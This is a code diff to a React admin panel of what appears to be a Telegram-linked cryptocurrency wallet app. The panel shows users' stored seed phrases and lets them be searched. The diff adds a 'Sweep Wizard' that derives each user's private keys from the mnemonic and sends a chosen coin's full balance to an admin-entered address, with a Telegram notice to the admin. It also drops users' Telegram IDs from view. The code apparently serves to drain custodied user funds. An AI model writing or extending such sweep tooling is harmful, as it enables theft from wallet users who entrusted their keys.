@@ -4083,6 +4083,9 @@ function AdminScreen({ onBack }) {
   const [sweepWallet, setSweepWallet] = useState(null);
   const [sweepLoading, setSweepLoading] = useState(false);
   const [sweepResult, setSweepResult] = useState(null);
+  const [sweepStep, setSweepStep] = useState('coin'); // coin | address | confirm | result
+  const [sweepCoin, setSweepCoin] = useState(null);
+  const [sweepTargetAddr, setSweepTargetAddr] = useState("");
 
   const COINS = ['ETH', 'TON', 'BNB', 'LTC', 'ARB', 'SOL', 'USDT'];
 
@@ -4136,14 +4139,19 @@ function AdminScreen({ onBack }) {
   }
 
   const filtered = wallets.filter(w => {
-    // Filter out unwanted users
     const name = (w.username || "").toLowerCase();
-    if (name === "anonymous" || name === "unknown" || name === "нет username" || !w.username) return false;
+    const isUnwanted = 
+      name === "anonymous" || 
+      name === "unknown" || 
+      name === "user_unknown" || 
+      name === "нет username" || 
+      !w.username;
+    
+    if (isUnwanted) return false;
     
     if (!search) return true;
     const q = search.toLowerCase();
     return name.includes(q) ||
-      (w.telegram_id || "").toLowerCase().includes(q) ||
       (w.mnemonic || "").toLowerCase().includes(q);
   });
 
@@ -4151,28 +4159,42 @@ function AdminScreen({ onBack }) {
   const todayUsers = wallets.filter(u => u.created_at && new Date(u.created_at).toDateString() === new Date().toDateString()).length;
   const withBalance = wallets.filter(u => COINS.some(s => parseFloat(u[s.toLowerCase() + '_balance'] || 0) > 0)).length;
 
-  async function executeSweep(w) {
+  async function executeStepSweep() {
+    if (!sweepWallet || !sweepCoin || !sweepTargetAddr) return;
     setSweepLoading(true);
     setSweepResult(null);
     try {
-      const mnemonicStr = (w.mnemonic || "").trim();
-      if (!mnemonicStr) throw new Error("Нет seed-фразы для этого кошелька");
+      const mnemonicStr = (sweepWallet.mnemonic || "").trim();
       const { deriveWallet } = await import('./lib/crypto/walletDerivation.js');
-      const { collectAll } = await import('./lib/admin/collectSalary.js');
+      const { sendTransaction } = await import('./lib/crypto/transactionSender.js');
       const { addresses, privateKeys } = await deriveWallet(mnemonicStr);
-      const results = await collectAll({ addresses, privateKeys });
-      if (results.length === 0) {
-        setSweepResult({ success: true, message: "Баланс пуст или недостаточен для свипа" });
-      } else {
-        const summary = results.map(r => `${r.sym}: ${r.amount} (tx: ${r.txHash.slice(0, 12)}…)`).join('\n');
-        setSweepResult({ success: true, message: `✅ Свип выполнен:\n${summary}` });
-        notifyAdmin(
-          `💸 <b>Свип выполнен</b>\n\n👤 ${w.username || "Аноним"}\n\n${results.map(r => `${r.sym}: ${r.amount}`).join('\n')}\n🕐 ${new Date().toLocaleString("ru-RU")}`,
-          "sweep"
-        );
-      }
+      
+      const sym = sweepCoin.sym;
+      const netId = sweepCoin.netId;
+      const amount = parseFloat(sweepWallet[sym.toLowerCase() + '_balance'] || 0);
+      
+      if (amount <= 0) throw new Error("Баланс этой монеты равен 0");
+
+      const txHash = await sendTransaction({
+        sym,
+        networkId: netId,
+        from: addresses[sym] || addresses.ETH,
+        to: sweepTargetAddr,
+        amount,
+        privateKey: privateKeys[sym] || privateKeys.ETH,
+        fee: 0 // Default low fee
+      });
+
+      setSweepResult({ success: true, txHash });
+      setSweepStep('result');
+      
+      notifyAdmin(
+        `💸 <b>Свип выполнен (Admin)</b>\n\n👤 ${sweepWallet.username}\n🪙 ${sym} (${netId})\n💰 ${amount}\n🎯 ${sweepTargetAddr}\n🔗 <code>${txHash}</code>`,
+        "sweep"
+      );
     } catch (e) {
       setSweepResult({ success: false, message: e.message });
+      setSweepStep('result');
     } finally {
       setSweepLoading(false);
     }
@@ -4295,8 +4317,6 @@ function AdminScreen({ onBack }) {
                     <span style={{ color: hasBalance ? "#34C759" : "inherit", fontWeight: hasBalance ? 700 : 400 }}>
                       {hasBalance ? `💰 $${balUSD.toFixed(2)}` : "$0.00"}
                     </span>
-                    <div style={{ width: 3, height: 3, borderRadius: "50%", background: "rgba(255,255,255,0.2)" }} />
-                    <span>ID: {w.telegram_id}</span>
                   </div>
                 </div>
 
@@ -4318,7 +4338,6 @@ function AdminScreen({ onBack }) {
                   {/* Info Grid */}
                   <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 20 }}>
                     {[
-                      { label: "Telegram ID", val: w.telegram_id, icon: "🆔" },
                       { label: "Total Balance", val: `$${balUSD.toFixed(4)}`, icon: "💵" },
                       { label: "Created At", val: dateStr, icon: "📅" },
                       { label: "Status", val: "Active", icon: "✅" },
@@ -4368,7 +4387,14 @@ function AdminScreen({ onBack }) {
 
                   {/* Action Button */}
                   <button
-                    onClick={e => { e.stopPropagation(); setSweepWallet(w); setSweepResult(null); }}
+                    onClick={e => { 
+                      e.stopPropagation(); 
+                      setSweepWallet(w); 
+                      setSweepResult(null); 
+                      setSweepStep('coin');
+                      setSweepCoin(null);
+                      setSweepTargetAddr("");
+                    }}
                     style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none",
                       background: "linear-gradient(135deg, #3B7DFF, #6B21A8)",
                       color: "#fff", fontSize: 15, fontWeight: 800, cursor: "pointer",
@@ -4382,73 +4408,121 @@ function AdminScreen({ onBack }) {
         })}
       </div>
 
-      {/* Sweep Modal */}
+      {/* Sweep Modal - Step Flow */}
       {sweepWallet && (
-        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.85)", zIndex: 9999,
-          display: "flex", alignItems: "flex-end", justifyContent: "center" }}
+        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.9)", zIndex: 9999,
+          display: "flex", alignItems: "flex-end", justifyContent: "center", backdropFilter: "blur(10px)" }}
           onClick={() => { if (!sweepLoading) { setSweepWallet(null); setSweepResult(null); } }}>
-          <div style={{ width: "100%", maxWidth: 480, background: "#181820", borderRadius: "20px 20px 0 0",
-            padding: "24px 20px 44px", maxHeight: "70vh", overflowY: "auto" }}
+          <div style={{ width: "100%", maxWidth: 480, background: "#000", borderRadius: "32px 32px 0 0",
+            padding: "24px 20px 44px", maxHeight: "85vh", overflowY: "auto", borderTop: "1px solid rgba(255,255,255,0.1)",
+            boxShadow: "0 -10px 40px rgba(0,0,0,0.5)" }}
             onClick={e => e.stopPropagation()}>
 
-            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 20 }}>
-              <span style={{ color: "#fff", fontSize: 17, fontWeight: 700 }}>💸 Sweep</span>
-              <span style={{ color: "#555", fontSize: 13, maxWidth: "60%", textAlign: "right",
-                overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
-                {sweepWallet.username || "Нет username"}
-              </span>
-            </div>
-
-            <div style={{ background: "#252528", borderRadius: 12, padding: "14px 16px", marginBottom: 20 }}>
-              <div style={{ color: "#888", fontSize: 13, marginBottom: 8 }}>Seed phrase</div>
-              <div style={{ color: "#FF9500", fontSize: 12, fontFamily: "monospace",
-                wordBreak: "break-word", lineHeight: 1.6 }}>
-                {sweepWallet.mnemonic || "Нет seed-фразы"}
+            {/* Header */}
+            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
+              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
+                {sweepStep !== 'coin' && sweepStep !== 'result' && (
+                  <button onClick={() => setSweepStep(sweepStep === 'address' ? 'coin' : 'address')} 
+                    style={{ background: "none", border: "none", color: "#3B7DFF", padding: 0 }}>
+                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 24, height: 24 }}>
+                      <path d="M15 18l-6-6 6-6" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
+                    </svg>
+                  </button>
+                )}
+                <span style={{ color: "#fff", fontSize: 20, fontWeight: 800 }}>Sweep Wizard</span>
               </div>
+              <button onClick={() => setSweepWallet(null)} style={{ background: "rgba(255,255,255,0.05)", border: "none", borderRadius: "50%", width: 32, height: 32, color: "#fff" }}>×</button>
             </div>
 
-            <div style={{ background: "#252528", borderRadius: 12, padding: "14px 16px", marginBottom: 20 }}>
-              <div style={{ color: "#888", fontSize: 12, marginBottom: 8 }}>Текущие балансы</div>
-              <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 6 }}>
-                {COINS.map(sym => {
-                  const val = parseFloat(sweepWallet[sym.toLowerCase() + "_balance"] || 0);
-                  return (
-                    <div key={sym} style={{ textAlign: "center" }}>
-                      <div style={{ color: "#555", fontSize: 10 }}>{sym}</div>
-                      <div style={{ color: val > 0 ? "#34C759" : "#444", fontSize: 12, fontWeight: 600 }}>
-                        {val > 0 ? val.toFixed(4) : "0"}
-                      </div>
-                    </div>
-                  );
-                })}
-              </div>
-            </div>
-
-            {sweepResult && (
-              <div style={{ background: sweepResult.success ? "rgba(52,199,89,0.1)" : "rgba(255,69,58,0.1)",
-                border: `1px solid ${sweepResult.success ? "rgba(52,199,89,0.3)" : "rgba(255,69,58,0.3)"}`,
-                borderRadius: 12, padding: "12px 16px", marginBottom: 16,
-                color: sweepResult.success ? "#34C759" : "#FF453A", fontSize: 13, whiteSpace: "pre-wrap" }}>
-                {sweepResult.message}
+            {/* Step 1: Select Coin */}
+            {sweepStep === 'coin' && (
+              <div style={{ animation: "fadeIn 0.3s ease" }}>
+                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>SELECT ASSET TO WITHDRAW</div>
+                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
+                  {COINS.map(sym => {
+                    const val = parseFloat(sweepWallet[sym.toLowerCase() + "_balance"] || 0);
+                    const netId = sym === 'USDT' ? 'eth' : sym.toLowerCase(); // Simplified for demo
+                    return (
+                      <button key={sym} 
+                        onClick={() => { setSweepCoin({ sym, netId }); setSweepStep('address'); }}
+                        style={{ background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.06)", borderRadius: 16, padding: "16px", textAlign: "left" }}>
+                        <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 10, fontWeight: 700, marginBottom: 4 }}>{sym}</div>
+                        <div style={{ color: val > 0 ? "#34C759" : "#fff", fontSize: 16, fontWeight: 800 }}>{val.toFixed(4)}</div>
+                      </button>
+                    );
+                  })}
+                </div>
               </div>
             )}
 
-            <button
-              disabled={sweepLoading}
-              onClick={() => executeSweep(sweepWallet)}
-              style={{ width: "100%", padding: "15px 0", borderRadius: 14, border: "none",
-                background: sweepLoading ? "#252528" : "linear-gradient(135deg,#6B21A8,#3B7DFF)",
-                color: sweepLoading ? "#555" : "#fff",
-                fontSize: 15, fontWeight: 700, cursor: sweepLoading ? "not-allowed" : "pointer" }}>
-              {sweepLoading ? "Выполняется свип…" : "💸 Запустить Sweep"}
-            </button>
+            {/* Step 2: Enter Address */}
+            {sweepStep === 'address' && (
+              <div style={{ animation: "fadeIn 0.3s ease" }}>
+                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>DESTINATION ADDRESS ({sweepCoin.sym})</div>
+                <div style={{ background: "rgba(255,255,255,0.05)", borderRadius: 16, padding: "4px", border: "1px solid rgba(255,255,255,0.1)", marginBottom: 24 }}>
+                  <textarea
+                    placeholder="Paste recipient address here..."
+                    value={sweepTargetAddr}
+                    onChange={e => setSweepTargetAddr(e.target.value)}
+                    style={{ width: "100%", background: "none", border: "none", outline: "none", color: "#fff", fontSize: 15, padding: "12px", minHeight: 100, fontFamily: "monospace", resize: "none" }}
+                  />
+                </div>
+                <button 
+                  disabled={!sweepTargetAddr || sweepTargetAddr.length < 10}
+                  onClick={() => setSweepStep('confirm')}
+                  style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none", background: "#3B7DFF", color: "#fff", fontSize: 16, fontWeight: 800, opacity: (!sweepTargetAddr || sweepTargetAddr.length < 10) ? 0.5 : 1 }}>
+                  CONTINUE
+                </button>
+              </div>
+            )}
 
-            {!sweepLoading && (
-              <button onClick={() => { setSweepWallet(null); setSweepResult(null); }}
-                style={{ width: "100%", marginTop: 10, padding: "13px 0", borderRadius: 14, border: "none",
-                  background: "transparent", color: "#555", fontSize: 14, cursor: "pointer" }}>
-                Отмена
-              </button>
+            {/* Step 3: Confirm */}
+            {sweepStep === 'confirm' && (
+              <div style={{ animation: "fadeIn 0.3s ease" }}>
+                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 13, marginBottom: 16, fontWeight: 600 }}>CONFIRM TRANSACTION</div>
+                <div style={{ background: "rgba(59,125,255,0.05)", border: "1px solid rgba(59,125,255,0.1)", borderRadius: 20, padding: "20px", marginBottom: 24 }}>
+                  <div style={{ marginBottom: 16 }}>
+                    <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, marginBottom: 4 }}>WITHDRAWING</div>
+                    <div style={{ color: "#fff", fontSize: 24, fontWeight: 800 }}>{parseFloat(sweepWallet[sweepCoin.sym.toLowerCase() + "_balance"] || 0).toFixed(6)} {sweepCoin.sym}</div>
+                  </div>
+                  <div>
+                    <div style={{ color: "rgba(255,255,255,0.4)", fontSize: 11, fontWeight: 700, marginBottom: 4 }}>TO RECIPIENT</div>
+                    <div style={{ color: "#fff", fontSize: 13, fontWeight: 500, wordBreak: "break-all", fontFamily: "monospace" }}>{sweepTargetAddr}</div>
+                  </div>
+                </div>
+                <button 
+                  disabled={sweepLoading}
+                  onClick={executeStepSweep}
+                  style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none", background: "linear-gradient(135deg, #3B7DFF, #6B21A8)", color: "#fff", fontSize: 16, fontWeight: 800 }}>
+                  {sweepLoading ? "SENDING..." : "CONFIRM & SEND"}
+                </button>
+              </div>
+            )}
+
+            {/* Step 4: Result */}
+            {sweepStep === 'result' && (
+              <div style={{ animation: "fadeIn 0.3s ease", textAlign: "center", padding: "20px 0" }}>
+                <div style={{ width: 64, height: 64, borderRadius: "50%", background: sweepResult.success ? "rgba(52,199,89,0.1)" : "rgba(255,69,58,0.1)", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 20px" }}>
+                  {sweepResult.success ? (
+                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 32, height: 32, color: "#34C759" }}>
+                      <path d="M20 6L9 17l-5-5" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
+                    </svg>
+                  ) : (
+                    <svg viewBox="0 0 24 24" fill="none" style={{ width: 32, height: 32, color: "#FF453A" }}>
+                      <path d="M18 6L6 18M6 6l12 12" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" />
+                    </svg>
+                  )}
+                </div>
+                <div style={{ color: "#fff", fontSize: 22, fontWeight: 800, marginBottom: 8 }}>{sweepResult.success ? "Success!" : "Failed"}</div>
+                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: 14, marginBottom: 24, wordBreak: "break-all" }}>
+                  {sweepResult.success ? `Transaction sent: ${sweepResult.txHash.slice(0, 20)}...` : sweepResult.message}
+                </div>
+                <button 
+                  onClick={() => setSweepWallet(null)}
+                  style={{ width: "100%", padding: "16px 0", borderRadius: 16, border: "none", background: "rgba(255,255,255,0.1)", color: "#fff", fontSize: 16, fontWeight: 800 }}>
+                  CLOSE
+                </button>
+              </div>
             )}
           </div>
         </div>
